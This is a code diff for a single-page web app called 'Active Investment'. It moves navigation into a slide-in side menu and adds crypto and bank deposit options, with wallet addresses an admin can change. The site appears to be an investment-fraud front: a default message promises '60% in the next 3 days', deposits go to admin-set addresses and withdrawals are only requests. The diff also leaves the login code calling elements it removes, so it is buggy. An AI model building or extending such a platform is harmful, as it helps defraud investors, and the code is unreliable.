@@ -267,8 +267,7 @@
             font-size: 2rem;
         }
 
-        .mobile-menu-btn {
-            display: none;
+        .menu-btn {
             background: transparent;
             border: 1px solid var(--gray-200);
             color: var(--gray-700);
@@ -276,25 +275,100 @@
             padding: 8px 15px;
             border-radius: 10px;
             cursor: pointer;
-        }
-
-        .nav-links {
             display: flex;
-            gap: 30px;
             align-items: center;
-            flex-wrap: wrap;
+            gap: 5px;
         }
 
-        .nav-links a {
+        .menu-btn i {
+            font-size: 1.8rem;
+        }
+
+        /* ===== SIDE MENU (SLIDE FROM RIGHT) ===== */
+        .side-menu {
+            position: fixed;
+            top: 0;
+            right: -300px;
+            width: 280px;
+            height: 100vh;
+            background: white;
+            box-shadow: var(--shadow-lg);
+            transition: right 0.3s ease;
+            z-index: 2000;
+            padding: 30px 20px;
+            overflow-y: auto;
+        }
+
+        .side-menu.open {
+            right: 0;
+        }
+
+        .side-menu-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .side-menu-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--primary);
+            font-size: 1.2rem;
+            font-weight: 700;
+        }
+
+        .close-menu-btn {
+            background: transparent;
+            border: none;
+            font-size: 1.8rem;
+            color: var(--gray-500);
+            cursor: pointer;
+        }
+
+        .side-menu ul {
+            list-style: none;
+        }
+
+        .side-menu li {
+            margin-bottom: 10px;
+        }
+
+        .side-menu a {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 15px;
             color: var(--gray-600);
             text-decoration: none;
-            font-weight: 500;
-            font-size: 0.95rem;
-            transition: color 0.3s;
+            border-radius: 12px;
+            transition: all 0.3s;
         }
 
-        .nav-links a:hover {
+        .side-menu a:hover {
+            background: var(--primary-soft);
             color: var(--primary);
+        }
+
+        .side-menu a.active {
+            background: var(--primary);
+            color: white;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1500;
+        }
+
+        .overlay.show {
+            display: block;
         }
 
         /* ===== PAGES ===== */
@@ -613,67 +687,22 @@
             border-radius: 12px;
         }
 
-        /* ===== DASHBOARD ===== */
+        /* ===== DASHBOARD (no sidebar now) ===== */
         .dashboard-container {
-            display: flex;
-            min-height: 100vh;
+            min-height: calc(100vh - 80px);
             background: var(--gray-50);
+            padding: 20px;
         }
 
-        .sidebar {
-            width: 280px;
-            background: white;
-            padding: 30px 20px;
-            border-right: 1px solid var(--gray-200);
-            position: sticky;
-            top: 0;
-            height: 100vh;
-            overflow-y: auto;
-        }
-
-        .sidebar-logo {
+        .dashboard-header {
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            gap: 10px;
-            color: var(--primary);
-            font-size: 1.2rem;
-            font-weight: 700;
             margin-bottom: 30px;
         }
 
-        .sidebar-menu {
-            list-style: none;
-        }
-
-        .sidebar-menu li {
-            margin-bottom: 10px;
-        }
-
-        .sidebar-menu a {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px 15px;
-            color: var(--gray-600);
-            text-decoration: none;
-            border-radius: 12px;
-            transition: all 0.3s;
-        }
-
-        .sidebar-menu a:hover {
-            background: var(--primary-soft);
-            color: var(--primary);
-        }
-
-        .sidebar-menu a.active {
-            background: var(--primary);
-            color: white;
-        }
-
-        .main-content {
-            flex: 1;
-            padding: 30px;
-            overflow-y: auto;
+        .dashboard-header h2 {
+            font-size: 1.5rem;
         }
 
         .dashboard-section {
@@ -842,6 +871,46 @@
             border-left: 4px solid var(--primary);
         }
 
+        /* ===== DEPOSIT METHODS ===== */
+        .method-selector {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .method-option {
+            background: var(--gray-50);
+            border: 2px solid var(--gray-200);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .method-option:hover {
+            border-color: var(--primary);
+        }
+
+        .method-option.selected {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+
+        .method-option i {
+            font-size: 2rem;
+            margin-bottom: 5px;
+        }
+
+        .method-details {
+            background: var(--gray-50);
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+        }
+
         /* ===== WITHDRAW SECTION ===== */
         .withdraw-info {
             background: var(--gray-50);
@@ -982,41 +1051,9 @@
             .hero-buttons {
                 justify-content: center;
             }
-            
-            .dashboard-container {
-                flex-direction: column;
-            }
-            
-            .sidebar {
-                width: 100%;
-                height: auto;
-                position: static;
-            }
         }
 
         @media (max-width: 768px) {
-            .mobile-menu-btn {
-                display: block;
-            }
-            
-            .nav-links {
-                display: none;
-                width: 100%;
-                flex-direction: column;
-                gap: 15px;
-                padding: 20px 0;
-            }
-            
-            .nav-links.show {
-                display: flex;
-            }
-            
-            .nav-links a {
-                width: 100%;
-                text-align: center;
-                padding: 10px;
-            }
-            
             .stats {
                 gap: 30px;
             }
@@ -1091,21 +1128,29 @@
                     <span>Active Investment</span>
                 </a>
                 
-                <button class="mobile-menu-btn" id="mobileMenuBtn">
+                <!-- Menu button (three dashes) -->
+                <button class="menu-btn" id="menuToggle">
                     <i class="fas fa-bars"></i>
                 </button>
-                
-                <div class="nav-links" id="navLinks">
-                    <a href="#" id="homeNav">Home</a>
-                    <a href="#" id="aboutNav">About</a>
-                    <a href="#" id="plansNav">Plans</a>
-                    <a href="#" id="referralNav">Referral</a>
-                    <a href="#" id="loginNavBtn">Login</a>
-                    <a href="#" id="signupNavBtn" class="btn btn-primary">Get Started</a>
-                </div>
             </div>
         </div>
     </nav>
+
+    <!-- ===== SIDE MENU (SLIDE FROM RIGHT) ===== -->
+    <div class="side-menu" id="sideMenu">
+        <div class="side-menu-header">
+            <div class="side-menu-logo">
+                <i class="fas fa-chart-line"></i>
+                <span>Active Investment</span>
+            </div>
+            <button class="close-menu-btn" id="closeMenuBtn">&times;</button>
+        </div>
+        <ul id="menuItems">
+            <!-- Menu items will be populated by JS based on login state -->
+        </ul>
+        <button id="logoutMenuBtn" class="btn btn-outline w-100 mt-2" style="display: none;">Logout</button>
+    </div>
+    <div class="overlay" id="overlay"></div>
 
     <!-- ===== PUBLIC PAGES ===== -->
     <div id="landingPage" class="page active">
@@ -1363,194 +1408,191 @@
         </div>
     </div>
 
-    <!-- ===== DASHBOARD ===== -->
+    <!-- ===== DASHBOARD (no sidebar, just content) ===== -->
     <div id="userDashboard" class="page">
         <div class="dashboard-container">
-            <div class="sidebar">
-                <div class="sidebar-logo">
-                    <i class="fas fa-chart-line"></i>
-                    <span>Active Investment</span>
-                </div>
-                
-                <ul class="sidebar-menu">
-                    <li><a href="#" class="active" data-page="overview"><i class="fas fa-home"></i> Overview</a></li>
-                    <li><a href="#" data-page="invest"><i class="fas fa-chart-line"></i> Invest</a></li>
-                    <li><a href="#" data-page="wallet"><i class="fas fa-wallet"></i> Fund Wallet</a></li>
-                    <li><a href="#" data-page="withdraw"><i class="fas fa-money-bill-wave"></i> Withdraw</a></li>
-                    <li><a href="#" data-page="referral"><i class="fas fa-users"></i> Referrals</a></li>
-                    <li><a href="#" data-page="portfolio"><i class="fas fa-chart-pie"></i> Portfolio</a></li>
-                    <li><a href="#" data-page="settings"><i class="fas fa-cog"></i> Settings</a></li>
-                    <li><a href="#" id="adminPanelBtn" style="display: none;"><i class="fas fa-user-shield"></i> Admin</a></li>
-                </ul>
-                
-                <button id="logoutBtn" class="btn btn-outline w-100 mt-2">Logout</button>
+            <div class="dashboard-header">
+                <h2>Welcome, <span id="userName">User</span>!</h2>
+                <!-- Menu button already in navbar, so nothing here -->
             </div>
             
-            <div class="main-content">
-                <!-- Overview Section -->
-                <div id="overviewSection" class="dashboard-section active">
-                    <h2>Welcome, <span id="userName">User</span>!</h2>
+            <!-- Overview Section -->
+            <div id="overviewSection" class="dashboard-section active">
+                <div class="wallet-card">
+                    <h3>Your Balance</h3>
+                    <div class="wallet-balance"><span id="userCurrency">$</span><span id="totalBalance">0.00</span></div>
+                </div>
+                
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <h3>Active Investments</h3>
+                        <div class="value" id="activeInvestments">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Total Profit</h3>
+                        <div class="value"><span id="userCurrency2">$</span><span id="totalProfit">0.00</span></div>
+                    </div>
+                </div>
+                
+                <!-- Promo Banner in Dashboard (Editable by Admin) -->
+                <div class="promo-banner" id="dashboardPromoBanner" style="margin-top:30px;">
+                    <!-- Content loaded from Firestore -->
+                </div>
+            </div>
+            
+            <!-- Invest Section -->
+            <div id="investSection" class="dashboard-section">
+                <h2>Investment Plans</h2>
+                <div class="plans-grid">
+                    <div class="plan-card">
+                        <h3>Essential Plan</h3>
+                        <p class="plan-amount"><span id="currencySymbol1">$</span>250</p>
+                        <button class="btn btn-primary w-100" onclick="investInPlan('Essential', 250)">Invest Now</button>
+                    </div>
+                    <div class="plan-card">
+                        <h3>Advanced Plan</h3>
+                        <p class="plan-amount"><span id="currencySymbol2">$</span>2,500</p>
+                        <button class="btn btn-primary w-100" onclick="investInPlan('Advanced', 2500)">Invest Now</button>
+                    </div>
+                    <div class="plan-card">
+                        <h3>Professional Plan</h3>
+                        <p class="plan-amount"><span id="currencySymbol3">$</span>15,000</p>
+                        <button class="btn btn-primary w-100" onclick="investInPlan('Professional', 15000)">Invest Now</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Fund Wallet Section (Deposit) -->
+            <div id="walletSection" class="dashboard-section">
+                <h2>Fund Your Wallet</h2>
+                <div class="auth-card" style="max-width: 600px; margin: 0;">
+                    <div class="method-selector" id="methodSelector">
+                        <div class="method-option selected" data-method="BTC" onclick="selectMethod('BTC')">
+                            <i class="fab fa-bitcoin"></i>
+                            <div>Bitcoin</div>
+                        </div>
+                        <div class="method-option" data-method="ETH" onclick="selectMethod('ETH')">
+                            <i class="fab fa-ethereum"></i>
+                            <div>Ethereum</div>
+                        </div>
+                        <div class="method-option" data-method="USDT" onclick="selectMethod('USDT')">
+                            <i class="fas fa-dollar-sign"></i>
+                            <div>Tether (USDT)</div>
+                        </div>
+                        <div class="method-option" data-method="BANK" onclick="selectMethod('BANK')">
+                            <i class="fas fa-university"></i>
+                            <div>Bank Transfer</div>
+                        </div>
+                    </div>
                     
-                    <div class="wallet-card">
-                        <h3>Your Balance</h3>
-                        <div class="wallet-balance"><span id="userCurrency">$</span><span id="totalBalance">0.00</span></div>
+                    <div class="method-details" id="methodDetails">
+                        <!-- Dynamic content based on selected method -->
                     </div>
                     
-                    <div class="stats-grid">
-                        <div class="stat-card">
-                            <h3>Active Investments</h3>
-                            <div class="value" id="activeInvestments">0</div>
+                    <form id="depositForm" style="margin-top: 20px;">
+                        <div class="form-group">
+                            <label>Amount (USD)</label>
+                            <input type="number" id="depositAmount" class="form-control" min="10" required>
                         </div>
-                        <div class="stat-card">
-                            <h3>Total Profit</h3>
-                            <div class="value"><span id="userCurrency2">$</span><span id="totalProfit">0.00</span></div>
-                        </div>
-                    </div>
-                    
-                    <!-- Promo Banner in Dashboard (Editable by Admin) -->
-                    <div class="promo-banner" id="dashboardPromoBanner" style="margin-top:30px;">
-                        <!-- Content loaded from Firestore -->
-                    </div>
+                        <input type="hidden" id="selectedMethod" value="BTC">
+                        <button type="submit" class="btn btn-primary w-100">Request Deposit</button>
+                    </form>
                 </div>
-                
-                <!-- Invest Section -->
-                <div id="investSection" class="dashboard-section">
-                    <h2>Investment Plans</h2>
-                    <div class="plans-grid">
-                        <div class="plan-card">
-                            <h3>Essential Plan</h3>
-                            <p class="plan-amount"><span id="currencySymbol1">$</span>250</p>
-                            <button class="btn btn-primary w-100" onclick="investInPlan('Essential', 250)">Invest Now</button>
-                        </div>
-                        <div class="plan-card">
-                            <h3>Advanced Plan</h3>
-                            <p class="plan-amount"><span id="currencySymbol2">$</span>2,500</p>
-                            <button class="btn btn-primary w-100" onclick="investInPlan('Advanced', 2500)">Invest Now</button>
-                        </div>
-                        <div class="plan-card">
-                            <h3>Professional Plan</h3>
-                            <p class="plan-amount"><span id="currencySymbol3">$</span>15,000</p>
-                            <button class="btn btn-primary w-100" onclick="investInPlan('Professional', 15000)">Invest Now</button>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Fund Wallet Section -->
-                <div id="walletSection" class="dashboard-section">
-                    <h2>Fund Your Wallet</h2>
-                    <div class="auth-card" style="max-width: 600px; margin: 0;">
-                        <form id="depositForm">
-                            <div class="form-group">
-                                <label>Amount (USD)</label>
-                                <input type="number" id="depositAmount" class="form-control" min="10" required>
-                            </div>
-                            <div class="form-group">
-                                <label>Cryptocurrency</label>
-                                <select id="depositCrypto" class="form-control">
-                                    <option value="BTC">Bitcoin (BTC)</option>
-                                    <option value="ETH">Ethereum (ETH)</option>
-                                    <option value="USDT">USDT</option>
-                                </select>
-                            </div>
-                            <button type="submit" class="btn btn-primary w-100">Request Deposit</button>
-                        </form>
-                    </div>
-                </div>
-                
-                <!-- Withdraw Section -->
-                <div id="withdrawSection" class="dashboard-section">
-                    <h2>Withdraw Funds</h2>
-                    <div class="auth-card" style="max-width: 600px; margin: 0;">
-                        <div class="withdraw-instructions" id="withdrawInstructions">
-                            <!-- Loaded from Firestore -->
-                            <p>Please read the withdrawal instructions below.</p>
-                        </div>
-                        <form id="withdrawForm">
-                            <div class="form-group">
-                                <label>Amount to Withdraw</label>
-                                <input type="number" id="withdrawAmount" class="form-control" min="1" required>
-                            </div>
-                            <div class="form-group">
-                                <label>Withdrawal Method</label>
-                                <select id="withdrawMethod" class="form-control">
-                                    <option value="bank">Bank Transfer</option>
-                                    <option value="crypto">Cryptocurrency</option>
-                                    <option value="paypal">PayPal</option>
-                                </select>
-                            </div>
-                            <div class="form-group">
-                                <label>Account Details</label>
-                                <textarea id="withdrawDetails" class="form-control" rows="3" placeholder="Provide your account/wallet details" required></textarea>
-                            </div>
-                            <button type="submit" class="btn btn-primary w-100">Request Withdrawal</button>
-                        </form>
-                    </div>
-                </div>
-                
-                <!-- Referral Section -->
-                <div id="referralSection" class="dashboard-section">
-                    <h2>Your Referral Program</h2>
-                    <div class="wallet-card">
-                        <h3>Your Referral Code</h3>
-                        <p style="font-size: 2rem;" id="userReferralCode">ACTIVE123</p>
-                        <button class="btn btn-outline" onclick="copyReferralCode()">Copy Code</button>
-                    </div>
-                </div>
-                
-                <!-- Portfolio Section (Active Investments) -->
-                <div id="portfolioSection" class="dashboard-section">
-                    <h2>Your Active Investments</h2>
-                    <div id="activeInvestmentsList"></div>
-                    <div class="investment-message" id="investmentMessage">
+            </div>
+            
+            <!-- Withdraw Section -->
+            <div id="withdrawSection" class="dashboard-section">
+                <h2>Withdraw Funds</h2>
+                <div class="auth-card" style="max-width: 600px; margin: 0;">
+                    <div class="withdraw-instructions" id="withdrawInstructions">
                         <!-- Loaded from Firestore -->
-                        Your investment will grow with 60% in the next 3 days.
+                        <p>Please read the withdrawal instructions below.</p>
                     </div>
+                    <form id="withdrawForm">
+                        <div class="form-group">
+                            <label>Amount to Withdraw</label>
+                            <input type="number" id="withdrawAmount" class="form-control" min="1" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Withdrawal Method</label>
+                            <select id="withdrawMethod" class="form-control">
+                                <option value="bank">Bank Transfer</option>
+                                <option value="crypto">Cryptocurrency</option>
+                                <option value="paypal">PayPal</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Account Details</label>
+                            <textarea id="withdrawDetails" class="form-control" rows="3" placeholder="Provide your account/wallet details" required></textarea>
+                        </div>
+                        <button type="submit" class="btn btn-primary w-100">Request Withdrawal</button>
+                    </form>
                 </div>
-                
-                <!-- Settings Section -->
-                <div id="settingsSection" class="dashboard-section">
-                    <h2>Account Settings</h2>
-                    <div class="settings-panel">
-                        <div class="settings-section">
-                            <h3>Security</h3>
-                            <div class="security-item">
-                                <div>
-                                    <h4>Two-Factor Authentication</h4>
-                                    <p>Add an extra layer of security</p>
-                                </div>
-                                <label class="switch">
-                                    <input type="checkbox" id="twoFactorToggle">
-                                    <span class="slider"></span>
-                                </label>
+            </div>
+            
+            <!-- Referral Section -->
+            <div id="referralSection" class="dashboard-section">
+                <h2>Your Referral Program</h2>
+                <div class="wallet-card">
+                    <h3>Your Referral Code</h3>
+                    <p style="font-size: 2rem;" id="userReferralCode">ACTIVE123</p>
+                    <button class="btn btn-outline" onclick="copyReferralCode()">Copy Code</button>
+                </div>
+            </div>
+            
+            <!-- Portfolio Section (Active Investments) -->
+            <div id="portfolioSection" class="dashboard-section">
+                <h2>Your Active Investments</h2>
+                <div id="activeInvestmentsList"></div>
+                <div class="investment-message" id="investmentMessage">
+                    <!-- Loaded from Firestore -->
+                    Your investment will grow with 60% in the next 3 days.
+                </div>
+            </div>
+            
+            <!-- Settings Section -->
+            <div id="settingsSection" class="dashboard-section">
+                <h2>Account Settings</h2>
+                <div class="settings-panel">
+                    <div class="settings-section">
+                        <h3>Security</h3>
+                        <div class="security-item">
+                            <div>
+                                <h4>Two-Factor Authentication</h4>
+                                <p>Add an extra layer of security</p>
                             </div>
-                            <button class="btn btn-outline" id="changePasswordBtn">Change Password</button>
+                            <label class="switch">
+                                <input type="checkbox" id="twoFactorToggle">
+                                <span class="slider"></span>
+                            </label>
                         </div>
-                        
-                        <div class="settings-section">
-                            <h3>Profile Information</h3>
-                            <form id="profileForm">
-                                <div class="form-group">
-                                    <label>Full Name</label>
-                                    <input type="text" id="profileName" class="form-control">
-                                </div>
-                                <div class="form-group">
-                                    <label>Preferred Currency</label>
-                                    <select id="profileCurrency" class="form-control">
-                                        <option value="USD">USD</option>
-                                        <option value="EUR">EUR</option>
-                                        <option value="GBP">GBP</option>
-                                        <option value="CAD">CAD</option>
-                                        <option value="AUD">AUD</option>
-                                        <option value="JPY">JPY</option>
-                                        <option value="CNY">CNY</option>
-                                        <option value="INR">INR</option>
-                                        <option value="BRL">BRL</option>
-                                        <option value="ZAR">ZAR</option>
-                                    </select>
-                                </div>
-                                <button type="submit" class="btn btn-primary">Save Changes</button>
-                            </form>
-                        </div>
+                        <button class="btn btn-outline" id="changePasswordBtn">Change Password</button>
+                    </div>
+                    
+                    <div class="settings-section">
+                        <h3>Profile Information</h3>
+                        <form id="profileForm">
+                            <div class="form-group">
+                                <label>Full Name</label>
+                                <input type="text" id="profileName" class="form-control">
+                            </div>
+                            <div class="form-group">
+                                <label>Preferred Currency</label>
+                                <select id="profileCurrency" class="form-control">
+                                    <option value="USD">USD</option>
+                                    <option value="EUR">EUR</option>
+                                    <option value="GBP">GBP</option>
+                                    <option value="CAD">CAD</option>
+                                    <option value="AUD">AUD</option>
+                                    <option value="JPY">JPY</option>
+                                    <option value="CNY">CNY</option>
+                                    <option value="INR">INR</option>
+                                    <option value="BRL">BRL</option>
+                                    <option value="ZAR">ZAR</option>
+                                </select>
+                            </div>
+                            <button type="submit" class="btn btn-primary">Save Changes</button>
+                        </form>
                     </div>
                 </div>
             </div>
@@ -1570,6 +1612,7 @@
                 <button class="btn btn-outline" onclick="showAdminTab('deposits')">Pending Deposits</button>
                 <button class="btn btn-outline" onclick="showAdminTab('withdrawals')">Withdrawals</button>
                 <button class="btn btn-outline" onclick="showAdminTab('investments')">Active Investments</button>
+                <button class="btn btn-outline" onclick="showAdminTab('payment')">Payment Settings</button>
                 <button class="btn btn-outline" onclick="showAdminTab('settings')">Site Settings</button>
             </div>
 
@@ -1605,6 +1648,28 @@
                     <textarea id="investmentMessageInput" rows="3" class="form-control" placeholder="E.g., Your investment will grow with 60% in the next 3 days"></textarea>
                     <button class="btn btn-primary mt-2" onclick="saveInvestmentMessage()">Save Message</button>
                 </div>
+            </div>
+
+            <!-- Payment Settings Tab -->
+            <div id="paymentTab" class="admin-card" style="display: none;">
+                <h3>Deposit Methods Configuration</h3>
+                <div class="form-group">
+                    <label>Bitcoin (BTC) Address</label>
+                    <input type="text" id="btcAddressInput" class="form-control" placeholder="Enter BTC address">
+                </div>
+                <div class="form-group">
+                    <label>Ethereum (ETH) Address</label>
+                    <input type="text" id="ethAddressInput" class="form-control" placeholder="Enter ETH address">
+                </div>
+                <div class="form-group">
+                    <label>Tether (USDT) Address</label>
+                    <input type="text" id="usdtAddressInput" class="form-control" placeholder="Enter USDT address">
+                </div>
+                <div class="form-group">
+                    <label>Bank Transfer Details</label>
+                    <textarea id="bankDetailsInput" rows="4" class="form-control" placeholder="Bank Name, Account Number, Routing Number, etc."></textarea>
+                </div>
+                <button class="btn btn-primary" onclick="savePaymentSettings()">Save Payment Settings</button>
             </div>
 
             <!-- Site Settings Tab -->
@@ -1721,6 +1786,14 @@
             'JPY': '¥', 'CNY': '¥', 'INR': '₹', 'BRL': 'R$', 'ZAR': 'R'
         };
 
+        // Payment settings cache
+        let paymentSettings = {
+            btc: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
+            eth: '0x742d35Cc6634C0532925a3b844Bc9e0F3A5C5b3a',
+            usdt: '0x742d35Cc6634C0532925a3b844Bc9e0F3A5C5b3a',
+            bank: 'Bank: Example Bank\nAccount: 1234567890\nRouting: 987654321'
+        };
+
         // ===== TOAST NOTIFICATION FUNCTION =====
         function showToast(message, type = 'success', title = 'Success') {
             const container = document.getElementById('toastContainer');
@@ -1742,11 +1815,20 @@
             
             container.appendChild(toast);
             
-            // Auto remove after 3 seconds
             setTimeout(() => {
                 if (toast.parentElement) toast.remove();
             }, 3000);
         }
+
+        // ===== MENU FUNCTIONS =====
+        function toggleMenu() {
+            document.getElementById('sideMenu').classList.toggle('open');
+            document.getElementById('overlay').classList.toggle('show');
+        }
+
+        document.getElementById('menuToggle').addEventListener('click', toggleMenu);
+        document.getElementById('closeMenuBtn').addEventListener('click', toggleMenu);
+        document.getElementById('overlay').addEventListener('click', toggleMenu);
 
         // ===== PAGE MANAGEMENT =====
         window.showPage = function(pageId) {
@@ -1755,6 +1837,9 @@
             });
             document.getElementById(pageId).classList.add('active');
             window.scrollTo(0, 0);
+            // Close menu if open
+            document.getElementById('sideMenu').classList.remove('open');
+            document.getElementById('overlay').classList.remove('show');
         }
 
         function showModal(modalId) {
@@ -1764,11 +1849,6 @@
         function closeModal(modalId) {
             document.getElementById(modalId).classList.remove('active');
         }
-
-        // ===== MOBILE MENU =====
-        document.getElementById('mobileMenuBtn').addEventListener('click', () => {
-            document.getElementById('navLinks').classList.toggle('show');
-        });
 
         // ===== VERIFICATION =====
         function generateCode() {
@@ -1833,7 +1913,7 @@
                 role: 'user',
                 twoFactorEnabled: false,
                 deposits: [],
-                investments: [], // each investment will have { plan, amount, date, profit }
+                investments: [],
                 withdrawalRequests: [],
                 referralCode: 'ACT' + Math.random().toString(36).substring(2, 8).toUpperCase(),
                 referralEarnings: 0,
@@ -1892,21 +1972,81 @@
         });
 
         function updateUserUI() {
+            // Update menu items based on login state
+            const menuList = document.getElementById('menuItems');
+            const logoutBtn = document.getElementById('logoutMenuBtn');
             if (!currentUser) {
-                // Show login/signup buttons
+                // Not logged in: show public menu (Home, About, Plans, Referral, Login, Signup)
+                menuList.innerHTML = `
+                    <li><a href="#" id="menuHome">Home</a></li>
+                    <li><a href="#" id="menuAbout">About</a></li>
+                    <li><a href="#" id="menuPlans">Plans</a></li>
+                    <li><a href="#" id="menuReferral">Referral</a></li>
+                    <li><a href="#" id="menuLogin">Login</a></li>
+                    <li><a href="#" id="menuSignup">Sign Up</a></li>
+                `;
+                logoutBtn.style.display = 'none';
+                
+                // Attach event listeners
+                document.getElementById('menuHome').addEventListener('click', (e) => { e.preventDefault(); showPage('landingPage'); toggleMenu(); });
+                document.getElementById('menuAbout').addEventListener('click', (e) => { e.preventDefault(); showPage('aboutPage'); toggleMenu(); });
+                document.getElementById('menuPlans').addEventListener('click', (e) => { e.preventDefault(); showPage('landingPage'); toggleMenu(); });
+                document.getElementById('menuReferral').addEventListener('click', (e) => { e.preventDefault(); showPage('referralPage'); toggleMenu(); });
+                document.getElementById('menuLogin').addEventListener('click', (e) => { e.preventDefault(); showPage('loginPage'); toggleMenu(); });
+                document.getElementById('menuSignup').addEventListener('click', (e) => { e.preventDefault(); showPage('signupPage'); toggleMenu(); });
+                
+                // Hide login/signup buttons in navbar
                 document.getElementById('loginNavBtn').style.display = 'inline-block';
                 document.getElementById('signupNavBtn').style.display = 'inline-block';
                 return;
             }
             
-            // Hide login/signup buttons when logged in
+            // Logged in: show dashboard menu
+            let adminItem = '';
+            if (currentUser.role === 'admin') {
+                adminItem = '<li><a href="#" id="menuAdmin"><i class="fas fa-user-shield"></i> Admin</a></li>';
+            }
+            menuList.innerHTML = `
+                <li><a href="#" id="menuOverview" class="active"><i class="fas fa-home"></i> Overview</a></li>
+                <li><a href="#" id="menuInvest"><i class="fas fa-chart-line"></i> Invest</a></li>
+                <li><a href="#" id="menuWallet"><i class="fas fa-wallet"></i> Fund Wallet</a></li>
+                <li><a href="#" id="menuWithdraw"><i class="fas fa-money-bill-wave"></i> Withdraw</a></li>
+                <li><a href="#" id="menuReferralDash"><i class="fas fa-users"></i> Referrals</a></li>
+                <li><a href="#" id="menuPortfolio"><i class="fas fa-chart-pie"></i> Portfolio</a></li>
+                <li><a href="#" id="menuSettings"><i class="fas fa-cog"></i> Settings</a></li>
+                ${adminItem}
+            `;
+            logoutBtn.style.display = 'block';
+            
+            // Attach event listeners for dashboard navigation
+            document.getElementById('menuOverview').addEventListener('click', (e) => { e.preventDefault(); showDashboardSection('overview'); toggleMenu(); });
+            document.getElementById('menuInvest').addEventListener('click', (e) => { e.preventDefault(); showDashboardSection('invest'); toggleMenu(); });
+            document.getElementById('menuWallet').addEventListener('click', (e) => { e.preventDefault(); showDashboardSection('wallet'); toggleMenu(); });
+            document.getElementById('menuWithdraw').addEventListener('click', (e) => { e.preventDefault(); showDashboardSection('withdraw'); toggleMenu(); });
+            document.getElementById('menuReferralDash').addEventListener('click', (e) => { e.preventDefault(); showDashboardSection('referral'); toggleMenu(); });
+            document.getElementById('menuPortfolio').addEventListener('click', (e) => { e.preventDefault(); showDashboardSection('portfolio'); toggleMenu(); loadActiveInvestments(); loadInvestmentMessage(); });
+            document.getElementById('menuSettings').addEventListener('click', (e) => { e.preventDefault(); showDashboardSection('settings'); toggleMenu(); });
+            if (currentUser.role === 'admin') {
+                document.getElementById('menuAdmin').addEventListener('click', (e) => { e.preventDefault(); showPage('adminPanel'); toggleMenu(); });
+            }
+            
+            logoutBtn.onclick = () => {
+                localStorage.removeItem('currentUserId');
+                currentUser = null;
+                updateUserUI();
+                showPage('landingPage');
+                showToast('Logged out successfully', 'info', 'Goodbye');
+                toggleMenu();
+            };
+            
+            // Hide login/signup buttons in navbar
             document.getElementById('loginNavBtn').style.display = 'none';
             document.getElementById('signupNavBtn').style.display = 'none';
             
+            // Update user info in dashboard
             document.getElementById('userName').textContent = currentUser.name;
             document.getElementById('totalBalance').textContent = (currentUser.balance || 0).toFixed(2);
             
-            // Calculate total profit from investments
             const totalProfit = (currentUser.investments || []).reduce((sum, inv) => sum + (inv.profit || 0), 0);
             document.getElementById('totalProfit').textContent = totalProfit.toFixed(2);
             document.getElementById('activeInvestments').textContent = (currentUser.investments || []).length;
@@ -1919,8 +2059,16 @@
             document.getElementById('profileName').value = currentUser.name || '';
             document.getElementById('profileCurrency').value = currentUser.currency || 'USD';
             
-            // Load active investments in portfolio section
             loadActiveInvestments();
+        }
+
+        function showDashboardSection(sectionId) {
+            document.querySelectorAll('.dashboard-section').forEach(s => s.classList.remove('active'));
+            document.getElementById(sectionId + 'Section').classList.add('active');
+            // Update menu active state
+            document.querySelectorAll('#menuItems a').forEach(a => a.classList.remove('active'));
+            const activeMenu = document.getElementById('menu' + sectionId.charAt(0).toUpperCase() + sectionId.slice(1));
+            if (activeMenu) activeMenu.classList.add('active');
         }
 
         // ===== LOAD ACTIVE INVESTMENTS FOR USER =====
@@ -1949,18 +2097,40 @@
             container.innerHTML = html;
         }
 
+        // ===== DEPOSIT METHOD SELECTION =====
+        window.selectMethod = function(method) {
+            document.querySelectorAll('.method-option').forEach(opt => opt.classList.remove('selected'));
+            document.querySelector(`.method-option[data-method="${method}"]`).classList.add('selected');
+            document.getElementById('selectedMethod').value = method;
+            updateMethodDetails(method);
+        }
+
+        function updateMethodDetails(method) {
+            const detailsDiv = document.getElementById('methodDetails');
+            let html = '';
+            if (method === 'BTC') {
+                html = `<p><strong>Bitcoin Address:</strong></p><div class="wallet-address">${paymentSettings.btc}</div>`;
+            } else if (method === 'ETH') {
+                html = `<p><strong>Ethereum Address:</strong></p><div class="wallet-address">${paymentSettings.eth}</div>`;
+            } else if (method === 'USDT') {
+                html = `<p><strong>Tether (USDT) Address:</strong></p><div class="wallet-address">${paymentSettings.usdt}</div>`;
+            } else if (method === 'BANK') {
+                html = `<p><strong>Bank Transfer Details:</strong></p><pre style="white-space: pre-wrap;">${paymentSettings.bank}</pre>`;
+            }
+            detailsDiv.innerHTML = html;
+        }
+
         // ===== DEPOSIT =====
         document.getElementById('depositForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            
             const amount = parseFloat(document.getElementById('depositAmount').value);
-            const currency = document.getElementById('depositCrypto').value;
+            const method = document.getElementById('selectedMethod').value;
 
             await db.collection('pendingDeposits').add({
                 userId: currentUser.id,
                 userName: currentUser.name,
                 amount,
-                currency,
+                method,
                 status: 'pending',
                 date: new Date().toISOString()
             });
@@ -1982,7 +2152,6 @@
                 return;
             }
 
-            // Create withdrawal request
             await db.collection('withdrawals').add({
                 userId: currentUser.id,
                 userName: currentUser.name,
@@ -2011,15 +2180,13 @@
 
